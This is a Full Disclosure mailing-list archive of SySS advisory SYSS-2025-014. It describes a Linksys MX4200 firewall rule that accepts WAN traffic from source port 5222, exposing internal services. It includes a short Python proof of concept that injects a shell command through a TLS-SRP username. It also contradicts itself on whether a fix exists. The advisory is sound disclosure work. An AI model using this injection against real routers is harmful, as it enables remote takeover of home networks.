---
title: [SYSS-2025-014] Linksys MX4200 - Improper Verification of Source of a Communication Channel
url: https://seclists.org/fulldisclosure/2026/Feb/19
source: Full Disclosure
date: 2026-02-16
fetch_date: 2026-02-17T04:21:57.313921
---

# [SYSS-2025-014] Linksys MX4200 - Improper Verification of Source of a Communication Channel

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#19)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#19)
[![Next](/images/right-icon-16x16.png)](14)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2025-014] Linksys MX4200 - Improper Verification of Source of a Communication Channel

---

*From*: Christian Zäske via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 12 Feb 2026 11:13:33 +0100

---

```
Advisory ID:               SYSS-2025-014
Product:                   MX4200 (and potentially others)
Manufacturer:              Linksys
Affected Version(s):       1.0.13.210200 (and potentially others)
Tested Version(s):         1.0.13.210200 MX4200
```

Vulnerability Type:        Improper Verification of Source of a
Communication Channel (CWE-940)

```
Risk Level:                Critical
Solution Status:           Fixed
Manufacturer Notification: 2025-03-18
Solution Date:             2025-06-24
Public Disclosure:         2026-02-12
CVE Reference:             Not yet assigned
Author of Advisory:        Christian Zäske, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

Linksys MX4200 is a Wi-Fi mesh router targeting home users.

The manufacturer describes the product as follows (see [1]):

"This router supports the latest Wi-Fi® 6 (802.11ax) standard for
next-level streaming and gaming. Its powerful WiFi 6 mesh coverage
offers faster WiFi performance for lag-free online gaming and
simultaneous streaming to every device and corner of your home."

Due to an improperly configured firewall rule, the router will accept
any connection on the WAN port with the source port 5222, exposing all
services which are normally only accessible through the local network.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The Linksys MX4200 (and potentially other models) contains the following
iptables rules:

  -A INPUT -i eth0 -j wan2self
  -A wan2self -j wan2self_ports
  -A wan2self_ports -p tcp -m tcp --sport 5222 -j xlog_accept_wan2self
  -A xlog_accept_wan2self -j ACCEPT

This chain of rules allows any incoming packets on port eth0 (WAN port)
which originate from port 5222. This leads to the exposure of any
services listening on 0.0.0.0 to be exposed to the internet if no
additional firewall is used. This is especially critical because of
```

other vulnerabilities reported, such as SYSS-2025-009, -010 and -011
(see [2]),

```
which can ultimately lead to unauthorized OS command injection over the
internet.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The following Python code will exploit SYSS-2025-010 over the internet:

  from socket import *
  from tlslite.api import *

  sock = socket.socket(AF_INET, SOCK_STREAM)
  sock.bind(('0.0.0.0', 5222))
  sock.connect(("203.0.113.100", 6060))

  conn = TLSConnection(sock)
```

  conn.handshakeClientSRP("; . /etc/led/lib\_nodes\_hw.sh; combo\_solid
yellow on;", "dummypass")

```
The only change to SYSS-2025-010 is the fixed source port 5222 and the
endpoint. This is no longer the local IP address, but the public IP
address that is accessible via the internet.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

There is no known solution yet.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2025-01-30: Vulnerability discovered
2025-03-18: Vulnerability reported to manufacturer
2025-04-07: First response from manufacturer
2025-04-14: Requested an update from manufacturer
2025-05-06: Acknowledgment of vulnerabilities by the manufacturer
2025-06-24: Fix published by manufacturer
2026-02-12: Public disclosure

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] Product website for Linksys MX4200
    https://support.linksys.com/kb/article/952-en/
[2] SYSS-2025-009, SYSS-2025-010 and SYSS-2025-011
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2025-009.txt
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2025-010.txt
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2025-011.txt
[3] SySS Security Advisory SYSS-2025-014
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2025-014.txt
[4] SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Christian Zäske of SySS
GmbH.

E-Mail: christian.zaeske () syss de
```

Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Christian_Zaeske.asc>

```
Key ID: 0x7B00D164A32F9AC9
Key Fingerprint: 51D4 6E9B 3C29 7347 AC01 0F5A 7B00 D164 A32F 9AC9

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: https://creativecommons.org/licenses/by/3.0/deed.en
```

**Attachment:
[OpenPGP\_0x7B00D164A32F9AC9.asc](att-19/OpenPGP_0x7B00D164A32F9AC9_asc.bin)**
*Description:* OpenPGP public key

**Attachment:
[OpenPGP\_signature.asc](att-19/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](18)
[By Date](date.html#19)
[![Next](/images/right-icon-16x16.png)](14)

[![Previous](/images/left-icon-16x16.png)](18)
[By Thread](index.html#19)
[![Next](/images/right-icon-16x16.png)](14)

### Current thread:

* **[SYSS-2025-014] Linksys MX4200 - Improper Verification of Source of a Communication Channel** *Christian Zäske via Fulldisclosure (Feb 16)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About]...